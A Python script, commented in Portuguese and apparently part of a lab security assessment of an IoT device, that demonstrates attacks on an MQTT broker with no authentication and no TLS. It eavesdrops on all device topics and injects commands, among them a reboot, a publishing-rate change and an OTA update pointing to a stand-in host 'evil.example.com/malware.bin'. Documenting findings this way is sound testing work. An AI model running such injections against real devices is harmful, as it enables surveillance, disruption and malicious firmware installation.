"""
NexaHome Technologies — NexaSense
Demonstração controlada: Injeção de comandos MQTT (perspectiva do atacante)

Este script demonstra que, sem autenticação no broker e sem TLS,
qualquer cliente na rede pode:
  1. Escutar toda a telemetria do dispositivo
  2. Publicar comandos arbitrários no tópico /cmd
  3. Enumerar todos os dispositivos da instalação

EVIDÊNCIA GERADA: network/evidence/mqtt-inject-demo.txt

IMPORTANTE: Execute apenas no ambiente de laboratório autorizado.

Uso:
    python 03_attacker_mqtt_inject.py
    python 03_attacker_mqtt_inject.py --listen   (só escuta telemetria)
    python 03_attacker_mqtt_inject.py --inject   (demonstra injeção)
"""

import paho.mqtt.client as mqtt
import json
import time
import argparse
import os
from datetime import datetime

BROKER_HOST = "localhost"   # Em lab real: 192.168.1.10
BROKER_PORT = 1883          # Sem TLS — achado F03
TARGET_ID   = "device001"   # ID estático — enumerável — achado F08
TOPIC_TELE  = f"/nexasense/{TARGET_ID}/telemetry"
TOPIC_CMD   = f"/nexasense/{TARGET_ID}/cmd"
TOPIC_ALL   = "/nexasense/#"  # escuta TODOS os dispositivos

received_messages = []
injected_commands = []


def on_connect(client, userdata, flags, rc, properties=None):
    rc_val = rc.value if hasattr(rc, 'value') else int(rc)
    if rc_val == 0:
        print(f"[ATACANTE] ✓ Conectado ao broker {BROKER_HOST}:{BROKER_PORT}")
        print(f"[ATACANTE] Sem autenticação necessária (allow_anonymous true)")
        print(f"[ATACANTE] Subscrevendo: {TOPIC_ALL}")
        client.subscribe(TOPIC_ALL, qos=0)
    else:
        print(f"[ATACANTE] ✗ Falha: rc={rc_val}")


def on_message(client, userdata, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        payload = json.loads(msg.payload.decode())
        pretty  = json.dumps(payload, indent=2)
    except Exception:
        pretty = msg.payload.decode()

    print(f"\n[ESCUTA] [{ts}] Tópico: {msg.topic}")
    print(f"         Payload capturado (texto claro):")
    for line in pretty.splitlines():
        print(f"           {line}")
    received_messages.append({"ts": ts, "topic": msg.topic, "payload": pretty})


def inject_command(client, cmd: dict, description: str):
    payload_json = json.dumps(cmd)
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n[INJECT] [{ts}] Publicando em {TOPIC_CMD}")
    print(f"[INJECT] Payload : {payload_json}")
    print(f"[INJECT] Descrição: {description}")
    result = client.publish(TOPIC_CMD, payload_json, qos=0)
    time.sleep(0.5)
    status = "ACEITO (broker sem autenticacao)"
    print(f"[INJECT] Resultado: {status} — broker não exigiu autenticação!")
    injected_commands.append({
        "ts": ts, "topic": TOPIC_CMD,
        "payload": payload_json, "status": status, "desc": description
    })
    time.sleep(1.5)


def save_evidence():
    base_dir     = os.path.dirname(os.path.abspath(__file__))
    evidence_dir = os.path.join(base_dir, "..", "network", "evidence")
    os.makedirs(evidence_dir, exist_ok=True)
    path = os.path.join(evidence_dir, "mqtt-inject-demo.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("# NexaSense — Demonstração Controlada: Injeção MQTT\n")
        f.write(f"# Data    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Broker  : {BROKER_HOST}:{BROKER_PORT}\n")
        f.write(f"# Alvo    : {TARGET_ID}\n")
        f.write("# Achados demonstrados: F03 (sem TLS), F06 (sem autenticação),\n")
        f.write("#                       F08 (device ID estático)\n")
        f.write("# ================================================================\n\n")

        f.write("=== TELEMETRIA INTERCEPTADA ===\n\n")
        for m in received_messages:
            f.write(f"[{m['ts']}] Tópico: {m['topic']}\n")
            f.write(f"Payload:\n{m['payload']}\n\n")

        f.write("\n=== COMANDOS INJETADOS (sem autenticação) ===\n\n")
        for c in injected_commands:
            f.write(f"[{c['ts']}] {c['topic']}\n")
            f.write(f"Payload : {c['payload']}\n")
            f.write(f"Status  : {c['status']}\n")
            f.write(f"Desc    : {c['desc']}\n\n")

        f.write("\n=== CONCLUSÃO ===\n")
        f.write(f"Mensagens interceptadas : {len(received_messages)}\n")
        f.write(f"Comandos injetados      : {len(injected_commands)}\n")
        f.write("Autenticação exigida    : NENHUMA\n")
        f.write("Criptografia utilizada  : NENHUMA\n")
        f.write("\nQualquer cliente na rede de laboratório conseguiu:\n")
        f.write(" - Ler toda a telemetria do dispositivo\n")
        f.write(" - Enviar comandos arbitrários (reboot, alteração de config)\n")
        f.write(" - Enumerar outros dispositivos via /nexasense/#\n")
    print(f"\n[✓] Evidência salva em: {path}")


def main():
    parser = argparse.ArgumentParser(description="Demonstração de ataque MQTT")
    parser.add_argument("--listen", action="store_true",
                        help="Apenas escuta telemetria por 30s (sem injetar)")
    parser.add_argument("--inject", action="store_true",
                        help="Executa apenas a injeção de comandos")
    args = parser.parse_args()

    # Se nenhum flag, faz ambos
    do_listen = args.listen or (not args.listen and not args.inject)
    do_inject = args.inject or (not args.listen and not args.inject)

    print("\n" + "="*60)
    print("  NexaSense — MQTT Attack Demonstration")
    print("  Perspectiva: Atacante na rede de laboratório")
    print(f"  Broker : {BROKER_HOST}:{BROKER_PORT} (sem TLS)")
    print(f"  Alvo   : {TARGET_ID}")
    print("="*60)
    print("\n  [!] Achados demonstrados:")
    print("  F03 — MQTT sem TLS (tráfego legível)")
    print("  F06 — Broker sem autenticação / ACL")
    print("  F08 — Device ID estático enumerável\n")

    # Conectar SEM credenciais (anonymous) — demonstra achado F06
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                         client_id="attacker_client_001")
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    except ConnectionRefusedError:
        print("\n[ERRO] Broker MQTT não encontrado!")
        print("       Inicie o Mosquitto: mosquitto -v")
        return

    client.loop_start()
    time.sleep(0.8)

    # ── FASE 1: Escuta ──────────────────────────────────────────────────────
    if do_listen:
        listen_time = 15
        print(f"\n[FASE 1] Escutando tópico {TOPIC_ALL} por {listen_time}s...")
        print(f"         (Execute o script 02 em outro terminal para ver dados)")
        print(f"         Aguardando mensagens...\n")
        time.sleep(listen_time)

    # ── FASE 2: Injeção de comandos ─────────────────────────────────────────
    if do_inject:
        print("\n[FASE 2] Injetando comandos no dispositivo...")
        print(f"         Tópico alvo: {TOPIC_CMD}\n")

        inject_command(client,
            {"cmd": "reboot", "source": "attacker"},
            "Reinicialização forçada do dispositivo"
        )
        inject_command(client,
            {"cmd": "set_interval", "value": 1, "source": "attacker"},
            "Alterar intervalo de publicação para 1s (DoS de dados)"
        )
        inject_command(client,
            {"cmd": "ota_update", "url": "http://evil.example.com/malware.bin"},
            "Tentativa de atualização OTA com firmware malicioso"
        )

    client.loop_stop()
    client.disconnect()

    save_evidence()

    print(f"\n{'='*60}")
    print(f"  RESUMO DA DEMONSTRAÇÃO")
    print(f"{'='*60}")
    print(f"  Mensagens interceptadas : {len(received_messages)}")
    print(f"  Comandos injetados      : {len(injected_commands)}")
    print(f"  Autenticação necessária : NENHUMA")
    print(f"  Criptografia usada      : NENHUMA")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
